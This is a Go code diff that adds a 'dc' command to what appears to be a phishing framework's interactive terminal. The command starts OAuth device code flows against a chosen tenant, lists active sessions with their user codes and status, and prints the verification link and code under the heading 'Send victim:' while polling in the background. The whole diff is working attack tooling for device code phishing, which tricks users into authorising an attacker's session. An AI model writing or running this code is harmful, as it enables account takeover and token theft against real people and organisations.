@@ -206,6 +206,12 @@ func (t *Terminal) DoWork() {
 			t.detached = true
 			do_quit = true
 			cmd_ok = true
+		case "dc":
+			cmd_ok = true
+			err := t.handleDeviceCode(args[1:])
+			if err != nil {
+				log.Error("dc: %v", err)
+			}
 		default:
 			log.Error("unknown command: %s", args[0])
 			cmd_ok = true
@@ -2318,4 +2324,52 @@ func (t *Terminal) filterInput(r rune) (rune, bool) {
 		return r, false
 	}
 	return r, true
+}
+
+// handleDeviceCode runs the "dc" command.
+//
+//	dc                     — list all sessions + status
+//	dc start [tenant/email] — start new device code flow
+func (t *Terminal) handleDeviceCode(args []string) error {
+	if len(args) == 0 || args[0] == "list" {
+		sessions := GetDeviceCodeSessions()
+		if len(sessions) == 0 {
+			log.Info("no device code sessions")
+			return nil
+		}
+		for _, s := range sessions {
+			s.mu.Lock()
+			status := s.Status
+			s.mu.Unlock()
+			elapsed := time.Since(s.StartedAt).Round(time.Second)
+			log.Info("[#%d] tenant=%-20s code=%-10s status=%-10s elapsed=%s",
+				s.ID, s.Tenant, s.UserCode, status, elapsed)
+		}
+		return nil
+	}
+
+	switch args[0] {
+	case "start":
+		tenant := "common"
+		if len(args) > 1 {
+			tenant = args[1]
+		}
+		sess, err := StartDeviceCode(tenant)
+		if err != nil {
+			return err
+		}
+		lc := color.New(color.FgHiCyan)
+		gc := color.New(color.FgHiGreen)
+		log.Success("device code session #%d started (tenant: %s)", sess.ID, sess.Tenant)
+		log.Info("")
+		log.Info("  Send victim:")
+		log.Info("  %s  %s", lc.Sprint(sess.VerificationURI), gc.Sprint("← link"))
+		log.Info("  %s  %s", gc.Sprint(sess.UserCode), lc.Sprint("← code to enter"))
+		log.Info("")
+		log.Info("  Expires in %d seconds. Polling in background...", sess.ExpiresIn)
+		return nil
+
+	default:
+		return fmt.Errorf("unknown subcommand '%s' — usage: dc [start [tenant]]", args[0])
+	}
 }
